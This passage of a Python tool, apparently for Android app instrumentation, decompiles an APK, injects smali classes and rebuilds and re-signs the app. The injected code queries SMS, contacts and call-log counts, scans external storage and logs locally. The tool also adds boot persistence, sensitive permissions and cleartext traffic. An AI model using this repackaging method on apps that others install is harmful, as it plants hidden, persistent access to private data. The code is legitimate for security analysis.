    invoke-direct {{v5}}, Landroid/content/ContentValues;-><init>()V

    const-string v6, "timestamp"
    invoke-static {{v1, v2}}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;
    move-result-object v7
    invoke-virtual {{v5, v6, v7}}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Long;)V

    const-string v6, "thread_id"
    invoke-static {{v3, v4}}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;
    move-result-object v7
    invoke-virtual {{v5, v6, v7}}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Long;)V

    const-string v6, "api_name"
    invoke-virtual {{v5, v6, p1}}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    const-string v6, "args"
    invoke-virtual {{v5, v6, p2}}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    const-string v6, "result"
    invoke-virtual {{v5, v6, p3}}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .catch Ljava/lang/Exception; {{:try_start .. :try_end}}:catch_0
    :try_start
    iget-object v6, p0, L{pkg}/ApiCallLogger;->mDb:Landroid/database/sqlite/SQLiteDatabase;
    const-string v7, "api_calls"
    const/4 v8, 0x0
    invoke-virtual {{v6, v7, v8, v5}}, Landroid/database/sqlite/SQLiteDatabase;->insert(Ljava/lang/String;Ljava/lang/String;Landroid/content/ContentValues;)J
    :try_end
    goto :end

    :catch_0
    move-exception v6
    :end
    return-void
.end method

.method public logNetworkCall(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;I)V
    .registers 14
    iget-object v0, p0, L{pkg}/ApiCallLogger;->mDb:Landroid/database/sqlite/SQLiteDatabase;
    if-eqz v0, :end

    invoke-static {{}}, Landroid/os/SystemClock;->elapsedRealtime()J
    move-result-wide v1

    invoke-static {{}}, Ljava/lang/Thread;->currentThread()Ljava/lang/Thread;
    move-result-object v3
    invoke-virtual {{v3}}, Ljava/lang/Thread;->getId()J
    move-result-wide v3

    new-instance v5, Landroid/content/ContentValues;
    invoke-direct {{v5}}, Landroid/content/ContentValues;-><init>()V

    const-string v6, "timestamp"
    invoke-static {{v1, v2}}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;
    move-result-object v7
    invoke-virtual {{v5, v6, v7}}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Long;)V

    const-string v6, "thread_id"
    invoke-static {{v3, v4}}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;
    move-result-object v7
    invoke-virtual {{v5, v6, v7}}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Long;)V

    const-string v6, "url"
    invoke-virtual {{v5, v6, p1}}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    const-string v6, "method"
    invoke-virtual {{v5, v6, p2}}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    const-string v6, "headers"
    invoke-virtual {{v5, v6, p3}}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    const-string v6, "response_code"
    invoke-static {{p4}}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;
    move-result-object v7
    invoke-virtual {{v5, v6, v7}}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    .catch Ljava/lang/Exception; {{:try_start .. :try_end}}:catch_1
    :try_start
    iget-object v6, p0, L{pkg}/ApiCallLogger;->mDb:Landroid/database/sqlite/SQLiteDatabase;
    const-string v7, "network_log"
    const/4 v8, 0x0
    invoke-virtual {{v6, v7, v8, v5}}, Landroid/database/sqlite/SQLiteDatabase;->insert(Ljava/lang/String;Ljava/lang/String;Landroid/content/ContentValues;)J
    :try_end
    goto :end

    :catch_1
    move-exception v6
    :end
    return-void
.end method

.method public logFileAccess(Ljava/lang/String;Ljava/lang/String;J)V
    .registers 14
    iget-object v0, p0, L{pkg}/ApiCallLogger;->mDb:Landroid/database/sqlite/SQLiteDatabase;
    if-eqz v0, :end

    invoke-static {{}}, Landroid/os/SystemClock;->elapsedRealtime()J
    move-result-wide v1

    invoke-static {{}}, Ljava/lang/Thread;->currentThread()Ljava/lang/Thread;
    move-result-object v3
    invoke-virtual {{v3}}, Ljava/lang/Thread;->getId()J
    move-result-wide v3

    new-instance v5, Landroid/content/ContentValues;
    invoke-direct {{v5}}, Landroid/content/ContentValues;-><init>()V

    const-string v6, "timestamp"
    invoke-static {{v1, v2}}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;
    move-result-object v7
    invoke-virtual {{v5, v6, v7}}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Long;)V

    const-string v6, "thread_id"
    invoke-static {{v3, v4}}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;
    move-result-object v7
    invoke-virtual {{v5, v6, v7}}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Long;)V

    const-string v6, "path"
    invoke-virtual {{v5, v6, p1}}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    const-string v6, "operation"
    invoke-virtual {{v5, v6, p2}}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    const-string v6, "size"
    invoke-static {{p3, p4}}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;
    move-result-object v7
    invoke-virtual {{v5, v6, v7}}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Long;)V

    .catch Ljava/lang/Exception; {{:try_start .. :try_end}}:catch_2
    :try_start
    iget-object v6, p0, L{pkg}/ApiCallLogger;->mDb:Landroid/database/sqlite/SQLiteDatabase;
    const-string v7, "file_access"
    const/4 v8, 0x0
    invoke-virtual {{v6, v7, v8, v5}}, Landroid/database/sqlite/SQLiteDatabase;->insert(Ljava/lang/String;Ljava/lang/String;Landroid/content/ContentValues;)J
    :try_end
    goto :end

    :catch_2
    move-exception v6
    :end
    return-void
.end method
"""

    def _smali_network_logger(self) -> str:
        pkg = INJECTED_PACKAGE.replace(".", "/")
        return f""".class public L{pkg}/NetworkLogger;
.super Ljava/lang/Object;
.source "NetworkLogger.java"

.field private mContext:Landroid/content/Context;
.field private mApiLogger:L{pkg}/ApiCallLogger;

.method public constructor <init>(Landroid/content/Context;)V
    .registers 4
    invoke-direct {{p0}}, Ljava/lang/Object;-><init>()V
    iput-object p1, p0, L{pkg}/NetworkLogger;->mContext:Landroid/content/Context;

    new-instance v0, L{pkg}/ApiCallLogger;
    invoke-direct {{v0, p1}}, L{pkg}/ApiCallLogger;-><init>(Landroid/content/Context;)V
    iput-object v0, p0, L{pkg}/NetworkLogger;->mApiLogger:L{pkg}/ApiCallLogger;
    return-void
.end method

.method public start()V
    .registers 2
    invoke-direct {{p0}}, L{pkg}/NetworkLogger;->querySms()V
    invoke-direct {{p0}}, L{pkg}/NetworkLogger;->queryContacts()V
    invoke-direct {{p0}}, L{pkg}/NetworkLogger;->queryCallLog()V
    return-void
.end method

.method private querySms()V
    .registers 9
    .catch Ljava/lang/Exception; {{:try_start .. :try_end}}:catch_0
    :try_start
    iget-object v0, p0, L{pkg}/NetworkLogger;->mContext:Landroid/content/Context;
    invoke-virtual {{v0}}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;
    move-result-object v0

    const-string v1, "content://sms"
    invoke-static {{v1}}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;
    move-result-object v1

    const/4 v2, 0x0
    const/4 v3, 0x0
    const/4 v4, 0x0
    const/4 v5, 0x0
    invoke-virtual/range {{v0 .. v5}}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    move-result-object v6

    if-eqz v6, :try_end
    invoke-interface {{v6}}, Landroid/database/Cursor;->getCount()I
    move-result v7
    invoke-interface {{v6}}, Landroid/database/Cursor;->close()V

    iget-object v0, p0, L{pkg}/NetworkLogger;->mApiLogger:L{pkg}/ApiCallLogger;
    if-eqz v0, :try_end
    const-string v1, "content://sms"
    const-string v2, "query"
    invoke-static {{v7}}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;
    move-result-object v3
    invoke-virtual {{v0, v1, v2, v3}}, L{pkg}/ApiCallLogger;->logApiCall(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    :try_end
    return-void
    :catch_0
    move-exception v0
    return-void
.end method

.method private queryContacts()V
    .registers 9
    .catch Ljava/lang/Exception; {{:try_start .. :try_end}}:catch_0
    :try_start
    iget-object v0, p0, L{pkg}/NetworkLogger;->mContext:Landroid/content/Context;
    invoke-virtual {{v0}}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;
    move-result-object v0

    sget-object v1, Landroid/provider/ContactsContract$Contacts;->CONTENT_URI:Landroid/net/Uri;

    const/4 v2, 0x0
    const/4 v3, 0x0
    const/4 v4, 0x0
    const/4 v5, 0x0
    invoke-virtual/range {{v0 .. v5}}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    move-result-object v6

    if-eqz v6, :try_end
    invoke-interface {{v6}}, Landroid/database/Cursor;->getCount()I
    move-result v7
    invoke-interface {{v6}}, Landroid/database/Cursor;->close()V

    iget-object v0, p0, L{pkg}/NetworkLogger;->mApiLogger:L{pkg}/ApiCallLogger;
    if-eqz v0, :try_end
    const-string v1, "content://contacts"
    const-string v2, "query"
    invoke-static {{v7}}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;
    move-result-object v3
    invoke-virtual {{v0, v1, v2, v3}}, L{pkg}/ApiCallLogger;->logApiCall(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    :try_end
    return-void
    :catch_0
    move-exception v0
    return-void
.end method

.method private queryCallLog()V
    .registers 9
    .catch Ljava/lang/Exception; {{:try_start .. :try_end}}:catch_0
    :try_start
    iget-object v0, p0, L{pkg}/NetworkLogger;->mContext:Landroid/content/Context;
    invoke-virtual {{v0}}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;
    move-result-object v0

    sget-object v1, Landroid/provider/CallLog$Calls;->CONTENT_URI:Landroid/net/Uri;

    const/4 v2, 0x0
    const/4 v3, 0x0
    const/4 v4, 0x0
    const/4 v5, 0x0
    invoke-virtual/range {{v0 .. v5}}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    move-result-object v6

    if-eqz v6, :try_end
    invoke-interface {{v6}}, Landroid/database/Cursor;->getCount()I
    move-result v7
    invoke-interface {{v6}}, Landroid/database/Cursor;->close()V

    iget-object v0, p0, L{pkg}/NetworkLogger;->mApiLogger:L{pkg}/ApiCallLogger;
    if-eqz v0, :try_end
    const-string v1, "content://call_log"
    const-string v2, "query"
    invoke-static {{v7}}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;
    move-result-object v3
    invoke-virtual {{v0, v1, v2, v3}}, L{pkg}/ApiCallLogger;->logApiCall(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    :try_end
    return-void
    :catch_0
    move-exception v0
    return-void
.end method
"""

    def _smali_file_observer(self) -> str:
        pkg = INJECTED_PACKAGE.replace(".", "/")
        return f""".class public L{pkg}/FileObserverHook;
.super Ljava/lang/Object;
.source "FileObserverHook.java"

.field private mContext:Landroid/content/Context;
.field private mApiLogger:L{pkg}/ApiCallLogger;

.method public constructor <init>(Landroid/content/Context;)V
    .registers 4
    invoke-direct {{p0}}, Ljava/lang/Object;-><init>()V
    iput-object p1, p0, L{pkg}/FileObserverHook;->mContext:Landroid/content/Context;

    new-instance v0, L{pkg}/ApiCallLogger;
    invoke-direct {{v0, p1}}, L{pkg}/ApiCallLogger;-><init>(Landroid/content/Context;)V
    iput-object v0, p0, L{pkg}/FileObserverHook;->mApiLogger:L{pkg}/ApiCallLogger;
    return-void
.end method

.method public start()V
    .registers 2
    invoke-virtual {{p0}}, L{pkg}/FileObserverHook;->scanExternalStorage()V
    return-void
.end method

.method public scanExternalStorage()V
    .registers 8
    .catch Ljava/lang/Exception; {{:try_start .. :try_end}}:catch_0
    :try_start
    invoke-static {{}}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;
    move-result-object v0

    invoke-virtual {{v0}}, Ljava/io/File;->listFiles()[Ljava/io/File;
    move-result-object v1
    if-eqz v1, :try_end

    const/4 v2, 0x0
    :loop_start
    array-length v3, v1
    if-ge v2, v3, :try_end

    aget-object v3, v1, v2
    invoke-virtual {{v3}}, Ljava/io/File;->getName()Ljava/lang/String;
    move-result-object v4

    invoke-virtual {{v3}}, Ljava/io/File;->isDirectory()Z
    move-result v5
    if-eqz v5, :skip

    invoke-virtual {{v3}}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;
    move-result-object v5
    invoke-virtual {{p0, v5}}, L{pkg}/FileObserverHook;->logDirAccess(Ljava/lang/String;)V

    :skip
    add-int/lit8 v2, v2, 0x1
    goto :loop_start
    :try_end
    return-void

    :catch_0
    move-exception v0
    return-void
.end method

.method public logDirAccess(Ljava/lang/String;)V
    .registers 6
    iget-object v0, p0, L{pkg}/FileObserverHook;->mApiLogger:L{pkg}/ApiCallLogger;
    if-eqz v0, :end
    const-string v1, "dir_scan"
    const-wide/16 v2, 0x0
    invoke-virtual {{v0, p1, v1, v2, v3}}, L{pkg}/ApiCallLogger;->logFileAccess(Ljava/lang/String;Ljava/lang/String;J)V
    :end
    return-void
.end method

.method public logFileAccess(Ljava/lang/String;Ljava/lang/String;)V
    .registers 9
    iget-object v0, p0, L{pkg}/FileObserverHook;->mApiLogger:L{pkg}/ApiCallLogger;
    if-eqz v0, :end

    new-instance v1, Ljava/io/File;
    invoke-direct {{v1, p1}}, Ljava/io/File;-><init>(Ljava/lang/String;)V
    invoke-virtual {{v1}}, Ljava/io/File;->length()J
    move-result-wide v2

    invoke-virtual {{v0, p1, p2, v2, v3}}, L{pkg}/ApiCallLogger;->logFileAccess(Ljava/lang/String;Ljava/lang/String;J)V
    :end
    return-void
.end method
"""

    def _smali_boot_receiver(self) -> str:
        pkg = INJECTED_PACKAGE.replace(".", "/")
        return f""".class public L{pkg}/BootReceiver;
.super Landroid/content/BroadcastReceiver;
.source "BootReceiver.java"

.method public constructor <init>()V
    .registers 1
    invoke-direct {{p0}}, Landroid/content/BroadcastReceiver;-><init>()V
    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .registers 6
    new-instance v0, Landroid/content/Intent;
    const-class v1, L{pkg}/InstrumentationService;
    invoke-direct {{v0, p1, v1}}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {{p1, v0}}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    return-void
.end method
"""

    def _inject_hook_calls(self) -> int:
        """Find the app's main Activity/Application smali and patch service start into onCreate."""
        print("    [*] Patching Application/Activity onCreate...")

        manifest_path = os.path.join(self.decompiled_dir, "AndroidManifest.xml")
        if not os.path.exists(manifest_path):
            print("    [!] No AndroidManifest.xml found")
            return 0

        with open(manifest_path, "r") as f:
            manifest = f.read()

        main_activity = self._get_main_activity(manifest)
        if not main_activity:
            print("    [!] Could not determine main activity from manifest")
            return 0

        smali_path = self._find_activity_smali(main_activity)
        if not smali_path:
            print(f"    [!] Could not find smali for {main_activity}")
            return 0

        return self._patch_smali_oncreate(smali_path, main_activity)

    def _get_main_activity(self, manifest: str) -> str:
        """Parse AndroidManifest.xml to find the main launcher activity."""
        activity_pattern = re.compile(
            r'<activity[^>]*android:name="([^"]+)"[^>]*>.*?'
            r'android\.intent\.action\.MAIN.*?android\.intent\.category\.LAUNCHER',
            re.DOTALL
        )
        match = activity_pattern.search(manifest)
        if match:
            return match.group(1)

        alt_pattern = re.compile(
            r'<activity[^>]*android:name="([^"]+)"[^>]*>.*?'
            r'android\.intent\.category\.LAUNCHER.*?android\.intent\.action\.MAIN',
            re.DOTALL
        )
        match = alt_pattern.search(manifest)
        if match:
            return match.group(1)

        launcher_pattern = re.compile(
            r'<activity[^>]*android:name="([^"]+)"[^>]*>',
            re.DOTALL
        )
        matches = launcher_pattern.findall(manifest)
        if matches:
            return matches[0]

        return ""

    def _find_activity_smali(self, activity_name: str) -> str:
        """Find the smali file for a given activity class name."""
        if activity_name.startswith("."):
            manifest_path = os.path.join(self.decompiled_dir, "AndroidManifest.xml")
            with open(manifest_path, "r") as f:
                manifest = f.read()
            pkg_match = re.search(r'package="([^"]+)"', manifest)
            if pkg_match:
                base_pkg = pkg_match.group(1)
                activity_name = base_pkg + activity_name

        smali_relative = activity_name.replace(".", "/") + ".smali"

        # Try direct path lookup first (fastest)
        direct_path = os.path.join(self.smali_dir, smali_relative)
        if os.path.isfile(direct_path):
            return direct_path

        # Search across all smali dirs (multi-dex: smali_classes2, etc.)
        for smali_sub in ["smali", "smali_classes2", "smali_classes3"]:
            candidate = os.path.join(self.decompiled_dir, smali_sub, smali_relative)
            if os.path.isfile(candidate):
                return candidate

        # Fallback: search by simple name + class signature match
        simple_name = activity_name.split(".")[-1] + ".smali"
        class_sig = f"L{activity_name.replace('.', '/')};"
        for root, dirs, files in os.walk(self.smali_dir):
            if simple_name in files:
                full_path = os.path.join(root, simple_name)
                with open(full_path, "r") as f:
                    content = f.read()
                if class_sig in content:
                    return full_path

        return ""

    def _patch_smali_oncreate(self, smali_path: str, activity_name: str) -> int:
        """Insert service-start code at the beginning of onCreate in the activity smali."""
        with open(smali_path, "r") as f:
            content = f.read()

        pkg = INJECTED_PACKAGE.replace(".", "/")

        # Prefer startForegroundService on API 26+ via ContextCompat-style try/catch pattern
        # implemented as startService (compatible) — InstrumentationService promotes itself.
        service_start = (
            f'    # --- INJECTED: Start instrumentation service ---\n'
            f'    new-instance v0, Landroid/content/Intent;\n'
            f'    const-class v1, L{pkg}/InstrumentationService;\n'
            f'    invoke-direct {{v0, p0, v1}}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V\n'
            f'    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I\n'
            f'    const/16 v2, 0x1a\n'
            f'    if-lt v1, v2, :legacy_start\n'
            f'    invoke-virtual {{p0, v0}}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;\n'
            f'    goto :after_start\n'
            f'    :legacy_start\n'
            f'    invoke-virtual {{p0, v0}}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;\n'
            f'    :after_start\n'
            f'    # --- END INJECTED ---\n'
        )

        if "INJECTED: Start instrumentation service" in content:
            print(f"    [*] {activity_name} already patched, skipping")
            return 0

        # Match both Application.onCreate()V and Activity.onCreate(Landroid/os/Bundle;)V
        # Be flexible about content between .locals/.registers and the body
        onCreate_pattern = re.compile(
            r'(\.method\s+(?:public|protected)\s+onCreate\([^)]*\)V\s*\n'
            r'\s*\.(?:registers|locals)\s+)(\d+)(\s*\n)',
            re.DOTALL
        )

        match = onCreate_pattern.search(content)
        if match:
            current_locals = int(match.group(2))
            needed = max(current_locals, 3)
            # Replace the locals count
            content = content[:match.start(2)] + str(needed) + content[match.end(2):]

            # Re-find to get updated match
            match = onCreate_pattern.search(content)
            if match:
                insert_pos = match.end()
                content = content[:insert_pos] + "\n" + service_start + content[insert_pos:]
                with open(smali_path, "w") as f:
                    f.write(content)
                print(f"    [+] Patched {activity_name}.onCreate() (.locals {needed})")
                return 1

        # Fallback: match any onCreate method
        simple_oncreate = re.compile(
            r'(\.method\s+(?:public|protected)\s+onCreate\([^)]*\)V\s*\n'
            r'\s*\.(?:registers|locals)\s+)(\d+)(\s*\n)',
            re.DOTALL
        )

        match = simple_oncreate.search(content)
        if match:
            current_locals = int(match.group(2))
            needed = max(current_locals, 3)
            content = content[:match.start(2)] + str(needed) + content[match.end(2):]
            match = simple_oncreate.search(content)
            if match:
                insert_pos = match.end()
                content = content[:insert_pos] + "\n" + service_start + content[insert_pos:]
                with open(smali_path, "w") as f:
                    f.write(content)
                print(f"    [+] Patched {activity_name}.onCreate() (.locals {needed})")
                return 1

        print(f"    [!] Could not find onCreate in {smali_path}")
        return 0

    def _patch_manifest(self):
        manifest_path = os.path.join(self.decompiled_dir, "AndroidManifest.xml")
        if not os.path.exists(manifest_path):
            return

        with open(manifest_path, "r") as f:
            content = f.read()

        pkg = INJECTED_PACKAGE

        service_tag = f"""
        <service android:name="{pkg}.InstrumentationService"
            android:exported="false"
            android:foregroundServiceType="dataSync" />

        <receiver android:name="{pkg}.BootReceiver"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>
"""
        insert_point = content.find("</application>")
        if insert_point != -1:
            content = content[:insert_point] + service_tag + content[insert_point:]

        if "usesCleartextTraffic" not in content:
            content = content.replace(
                "<application",
                '<application android:usesCleartextTraffic="true"'
            )

        if "<uses-sdk" not in content:
            uses_sdk = '    <uses-sdk android:minSdkVersion="24" android:targetSdkVersion="30" />\n'
            insert = content.find("<application")
            if insert != -1:
                content = content[:insert] + uses_sdk + content[insert:]

        with open(manifest_path, "w") as f:
            f.write(content)
        print("    Manifest patched with service and receiver")

    def _add_permissions(self):
        manifest_path = os.path.join(self.decompiled_dir, "AndroidManifest.xml")
        if not os.path.exists(manifest_path):
            return

        with open(manifest_path, "r") as f:
            content = f.read()

        permissions = [
            "android.permission.INTERNET",
            "android.permission.ACCESS_NETWORK_STATE",
            "android.permission.WRITE_EXTERNAL_STORAGE",
            "android.permission.READ_EXTERNAL_STORAGE",
            "android.permission.READ_SMS",
            "android.permission.READ_CONTACTS",
            "android.permission.READ_CALL_LOG",
            "android.permission.FOREGROUND_SERVICE",
            "android.permission.FOREGROUND_SERVICE_DATA_SYNC",
            "android.permission.RECEIVE_BOOT_COMPLETED",
            "android.permission.WAKE_LOCK",
            "android.permission.POST_NOTIFICATIONS",
        ]

        added = 0
        for perm in permissions:
            if perm not in content:
                tag = f'    <uses-permission android:name="{perm}" />\n'
                insert = content.find("<application")
                if insert != -1:
                    content = content[:insert] + tag + content[insert:]
                    added += 1

        with open(manifest_path, "w") as f:
            f.write(content)
        print(f"    Added {added} new permissions ({len(permissions)} total)")

    def _recompile(self) -> str:
        print("[*] Recompiling instrumented APK...")
        output_apk = os.path.join(self.work_dir, "instrumented-unsigned.apk")

        cmd = [self.apktool, "b", self.decompiled_dir, "-o", output_apk, "-f"]
        env = os.environ.copy()
        sdk = self.android_sdk or os.environ.get("ANDROID_HOME", "")
        if sdk:
            bt = os.path.join(sdk, "build-tools")
            if os.path.isdir(bt):
                versions = sorted(os.listdir(bt), reverse=True)
                if versions:
                    env["PATH"] = os.path.join(bt, versions[0]) + ":" + env.get("PATH", "")

        result = subprocess.run(cmd, capture_output=True, text=True, env=env)
        if result.returncode == 0 and os.path.isfile(output_apk):
            print(f"    Built: {output_apk}")
            return output_apk

        print(f"    [!] apktool build failed, trying manual build pipeline...")
        return self._recompile_manual(output_apk)

    def _recompile_manual(self, output_apk: str) -> str:
        """Manual build: smali -> dex, aapt2 compile+link, merge, zipalign."""
        sdk = self.android_sdk or os.environ.get("ANDROID_HOME", "")
        bt_dir = ""
        if sdk:
            bt = os.path.join(sdk, "build-tools")
            if os.path.isdir(bt):
                versions = sorted(os.listdir(bt), reverse=True)
                if versions:
                    bt_dir = os.path.join(bt, versions[0])

        smali_jar = "/usr/share/apktool/smali.jar"
        aapt2 = os.path.join(bt_dir, "aapt2") if bt_dir else shutil.which("aapt2") or ""
        d8 = os.path.join(bt_dir, "d8.jar") if bt_dir else ""
        zipalign = os.path.join(bt_dir, "zipalign") if bt_dir else shutil.which("zipalign") or ""
        apksigner = os.path.join(bt_dir, "apksigner") if bt_dir else shutil.which("apksigner") or ""

        if not aapt2 or not os.path.isfile(aapt2):
            raise RuntimeError("aapt2 not found; cannot rebuild APK")
        if not os.path.isfile(smali_jar):
            smali_jar = shutil.which("smali") or ""
            if not smali_jar:
                raise RuntimeError("smali not found; cannot assemble dex")

        tmp_build = os.path.join(self.work_dir, "_manual_build")
        os.makedirs(tmp_build, exist_ok=True)

        # Step 1: Smali -> DEX
        print("    [manual] Assembling smali -> classes.dex...")
        smali_dirs = []
        for name in os.listdir(self.decompiled_dir):
            if name.startswith("smali"):
                smali_dirs.append(os.path.join(self.decompiled_dir, name))

        dex_list = []
        for i, sd in enumerate(smali_dirs):
            dex_name = "classes.dex" if i == 0 else f"classes{i + 1}.dex"
            dex_path = os.path.join(tmp_build, dex_name)
            cmd_smali = ["java", "-jar", smali_jar, "assemble", sd, "-o", dex_path]
            r = subprocess.run(cmd_smali, capture_output=True, text=True)
            if r.returncode != 0:
                raise RuntimeError(f"smali assemble failed for {sd}:\n{r.stderr}")
            dex_list.append(dex_path)
            print(f"        {dex_name} ({os.path.getsize(dex_path)} bytes)")

        # Step 2: Aapt2 compile resources
        print("    [manual] Compiling resources with aapt2...")
        res_dir = os.path.join(self.decompiled_dir, "res")
        compiled_res = os.path.join(tmp_build, "compiled_res.zip")
        cmd_compile = [aapt2, "compile", "--dir", res_dir, "-o", compiled_res]
        r = subprocess.run(cmd_compile, capture_output=True, text=True)
        if r.returncode != 0:
            raise RuntimeError(f"aapt2 compile failed:\n{r.stderr}")

        # Step 3: Aapt2 link resources
        print("    [manual] Linking resources...")
        manifest = os.path.join(self.decompiled_dir, "AndroidManifest.xml")
        base_apk = os.path.join(tmp_build, "base.apk")
        framework = os.path.expanduser("~/.local/share/apktool/framework/1.apk")
        cmd_link = [aapt2, "link", "-o", base_apk, "-I", framework,
                     "--manifest", manifest, compiled_res]
        r = subprocess.run(cmd_link, capture_output=True, text=True)
        if r.returncode != 0:
            raise RuntimeError(f"aapt2 link failed:\n{r.stderr}")

        # Step 4: Merge DEX into APK
        print("    [manual] Merging DEX into APK...")
        merged_apk = os.path.join(tmp_build, "merged.apk")
        shutil.copy2(base_apk, merged_apk)
        for dex in dex_list:
            subprocess.run(
                ["zip", "-j", merged_apk, dex],
                capture_output=True
            )

        # Step 5: Zipalign
        if zipalign and os.path.isfile(zipalign):
            print("    [manual] Zipaligning...")
            aligned_apk = os.path.join(tmp_build, "aligned.apk")
            r = subprocess.run([zipalign, "-f", "4", merged_apk, aligned_apk],
                               capture_output=True, text=True)
            if r.returncode == 0:
                shutil.move(aligned_apk, output_apk)
            else:
                shutil.move(merged_apk, output_apk)
        else:
            shutil.move(merged_apk, output_apk)

        print(f"    Built (manual): {output_apk}")
        return output_apk

    def _sign(self, apk_path: str) -> str:
        print("[*] Signing APK...")
        os.makedirs(self.output_dir, exist_ok=True)
        signed_path = os.path.join(
            self.output_dir,
            f"instrumented-{os.path.basename(self.apk_path)}"
        )

        # Resolve keystore: prefer project-level, then generate one
        keystore = str(ROOT / "keystore.jks") if ROOT.exists() else ""
        if not keystore or not os.path.isfile(keystore):
            keystore = os.path.expanduser("~/.android/debug.keystore")
        if not os.path.isfile(keystore):
            keystore = os.path.join(self.work_dir, "debug.keystore")
            subprocess.run([
                "keytool", "-genkeypair", "-v",
                "-keystore", keystore,
                "-alias", "androiddebugkey",
                "-keyalg", "RSA", "-keysize", "2048",
                "-validity", "10000",
                "-storepass", "android",
                "-keypass", "android",
                "-dname", "CN=Android Debug,O=Android,C=US",
            ], capture_output=True)
        print(f"    Keystore: {keystore}")

        # Find apksigner: SDK build-tools → system which → jar fallback
        apksigner = self._find_apksigner()

        if apksigner:
            signed = self._sign_with_apksigner(apk_path, signed_path, keystore, apksigner)
            if signed:
                return signed

        uber_signer = self.tool_jars.get("uber-apk-signer") or self.tool_jars.get("uber-apk-signer.jar")
        if uber_signer:
            cmd = [
                "java", "-jar", uber_signer,
                "--apks", apk_path,
                "--allowResign",
                "--overwrite",
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            aligned = apk_path.replace("-unsigned.apk", "-aligned-debugSigned.apk")
            if os.path.exists(aligned):
                shutil.copy2(aligned, signed_path)
                print(f"    Signed: {signed_path}")
                return signed_path

        shutil.copy2(apk_path, signed_path)
        print(f"    [!] No signer available, copied unsigned: {signed_path}")
        return signed_path

    def _find_apksigner(self) -> str:
        """Locate apksigner binary or wrapper script."""
        # 1. Android SDK build-tools
        sdk = self.android_sdk or os.environ.get("ANDROID_HOME", "")
        if sdk:
            bt = os.path.join(sdk, "build-tools")
            if os.path.isdir(bt):
                for ver in sorted(os.listdir(bt), reverse=True):
                    candidate = os.path.join(bt, ver, "apksigner")
                    if os.path.isfile(candidate) and os.access(candidate, os.X_OK):
                        return candidate

        # 2. System-installed (Debian/Ubuntu puts wrapper at /usr/bin/apksigner)
        which = shutil.which("apksigner")
        if which:
            return which

        # 3. Direct jar fallback (Debian java path)
        jar = "/usr/share/java/apksigner.jar"
        if os.path.isfile(jar):
            return jar

        return ""

    def _sign_with_apksigner(self, apk_path: str, signed_path: str,
                             keystore: str, apksigner: str) -> str | None:
        """Sign using apksigner. Returns signed_path on success, None on failure."""
        # Resolve keystore alias by querying the keystore
        aliases = self._get_keystore_aliases(keystore)
        if not aliases:
            aliases = ["androiddebugkey", "debug", "android-instrumentor"]

        for alias in aliases:
            cmd = self._build_sign_cmd(apk_path, signed_path, keystore, apksigner, alias)
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0 and os.path.isfile(signed_path):
                # Verify the signature is actually valid
                if self._verify_signature(signed_path, apksigner):
                    print(f"    Signed (apksigner v1+v2+v3, alias={alias}): {signed_path}")
                    return signed_path
                else:
